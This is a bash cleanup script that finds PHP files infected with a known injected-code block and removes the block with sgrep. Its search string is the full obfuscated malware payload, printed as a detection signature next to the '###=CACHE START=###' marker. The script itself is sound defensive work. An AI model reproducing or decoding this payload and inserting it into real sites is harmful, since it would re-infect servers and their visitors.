#!/bin/bash
#
# Effin NSA/KGB(?) code all over the place.. Making a sweet fuckin mess... This is a find & replace, works recursively from the CWD
#
# Creds:
#	This script was written by DocDawning (doc@dawning.ca)
#	Much help was received from various corners of the primary interwebs
#	Massive props to Dirkt of GitHub for assisting
#
# Related:
# 	http://unix.stackexchange.com/questions/322912/complex-multiline-search-replace-to-remove-injected-code
#
# License:
#	MIT
#	See attached LICENSE file
#

##### VARS ######
SEARCH_STRING="nJLtXPScp3AyqPtxnJW2XFxtrlNtMKWlo3WspzIjo3W0nJ5aXQNcBjccMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFxtrlOyL2uiVPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKGftsFOyoUAyVUfXWUIloPN9VPWbqUEjBv8ioT9uMUIjMTS0MKZhL29gY2qyqP5jnUN/nKN9Vv51pzkyozAiMTHbWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0cYvVzMQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMcCGRznQ0vYz1xAFtvZwSxLGVkAwqzBJEvBTSwAwV4ZwLkMGp3AQyvLJH1ZwDkZFVcBjccMvuzqJ5wqTyioy9yrTymqUZbVzA1pzksnJ5cqPVcXFO7PvEwnPN9VTA1pzksnJ5cqPtxqKWfXGfXL3IloS9mMKEipUDbWTAbYPOQIIWZG1OHK0uSDHESHvjtExSZH0HcB2A1pzksp2I0o3O0XPEwqKWfYPOQIIWZG1OHK0ACGx5SD1EHFH1SG1IHYPN1XGftL3IloS9mMKEipUDbWTA1pzjfVRAIHxkCHSEsIRyAEH9IIPjtAFx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9FEIEIHx5HHxSBH0MSHvjtISWIEFx7PvEcLaLtCFOwqKWfK2I4MJZbWTAbXGfXL3IloS9woT9mMFtxL2tcBjc9VTIfp2IcMvucozysM2I0XPWuoTkiq191pzksMz9jMJ4vXFN9CFNkXFO7PvEcLaLtCFOznJkyK2qyqS9wo250MJ50pltxqKWfXGfXsDccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtoJD1XT1xAFtxK1WSHIISH1EoVaNvKFxcVQ09VPVkAwN0MwH5ZmxjZwp3ZGVlBGp1BJDjMQHkAGyzA2HkLvVcVUftMKMuoPumqUWcpUAfLKAbMKZbWS9FEISIEIAHJlWwVy0cXGftsDcyL2uiVPEcLaL7PtxWPK0tsD"
REPLACE_STRING=""
AFFECTED_FILE_LIST=$0.affectedFiles
UNALTERED_INFECTED_LIST=$0.infected-but-unaltered
BASE_DIR=$1


### MAIN BEGINS
if [ $# -ne 1 ]; then
	echo -e "Usage: ./$0 [base directory to recursive in to]"
	echo -e "\n\nNote that if you use an input file with \" characters, you must escape them, you sack of...\\\""
	exit 1
fi

### FIRST WE'LL MAKE A LIST OF FILENAMES, ONE PER LINE, THAT PROBABLY CONTAIN THE INJECTED FUCKERY
echo -e "\n\nBeginning search in $BASE_DIR"
grep -Rl "$SEARCH_STRING" $BASE_DIR > $AFFECTED_FILE_LIST
NUMBER_OF_AFFECTED_FILES=$(wc -l < "$AFFECTED_FILE_LIST")

if [ $NUMBER_OF_AFFECTED_FILES -lt 1 ]; then
	echo -e "No affected files were found under `pwd`. Halting."
	exit 0
fi

echo -e "$NUMBER_OF_AFFECTED_FILES affected files are reported in \"$AFFECTED_FILE_LIST\""

### IF THE UNALTERED_INFECTED_LIST EXISTS, DELETE
if [ -a $UNALTERED_INFECTED_LIST ]
then
	rm $UNALTERED_INFECTED_LIST
fi
touch $UNALTERED_INFECTED_LIST

FIXED_FILE_COUNT=0

### ITERATE THROUGH THE AFFECTED FILES, DO SOMETHING ABOUT IT
for infectedFile in `cat $AFFECTED_FILE_LIST`
do
	PRE_SUM=`sum $infectedFile`	

	cp $infectedFile $infectedFile.temp
	sgrep -o '%r\n' '(start .. end) extracting ("<?php".."?>" containing "###=CACHE START=###")' $infectedFile.temp > $infectedFile
	
	# There will still be ones that weren't wrapped by <?php ?> left. Handle those next
	cp $infectedFile $infectedFile.temp
	sgrep -o '%r\n' '(start .. end) extracting ("//###=CACHE START=###".."//###=CACHE END=###" containing "nJLtXPScp3AyqPtxnJW2XFxtrlNtMKWlo3WspzIjo")' $infectedFile.temp > $infectedFile

	#clean up
	rm $infectedFile.temp

	POST_SUM=`sum $infectedFile`
	if [ "$PRE_SUM" == "$POST_SUM" ]
	then
		echo -e "Infected file not altered: $infectedFile"
		echo "$infectedFile" >> $UNALTERED_INFECTED_LIST
	else
		((FIXED_FILE_COUNT++))
	fi
done

### ANYTHING THAT DIDN'T GET CLEANED WILL NOW BE REPORTED
if [ -s $UNALTERED_INFECTED_LIST ]
then
	echo "Some infected files were not successfully cleaned, they're listed here: $UNALTERED_INFECTED_LIST"
else
	rm $UNALTERED_INFECTED_LIST
fi

echo -e "Fixed $FIXED_FILE_COUNT/$NUMBER_OF_AFFECTED_FILES infected files, from hell"
